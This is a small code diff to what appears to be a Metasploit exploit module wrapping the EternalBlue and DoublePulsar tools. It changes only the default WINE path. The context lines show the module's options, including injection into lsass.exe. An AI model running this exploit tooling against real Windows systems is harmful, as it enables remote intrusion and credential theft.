@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Exploit::Remote
 		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x64',['x86','x64']]),
 		OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','~/Eternalblue-Doublepulsar-Metasploit/deps/']),
 		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','~/Eternalblue-Doublepulsar-Metasploit/deps/']),
-		OptString.new('WINEPATH',[true,'WINE drive_c path','~/.wine/drive_c/']),
+		OptString.new('WINEPATH',[true,'WINE drive_c path','~/fedora/root/.wine/drive_c/']),
 		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','lsass.exe'])
 	], self.class)
 
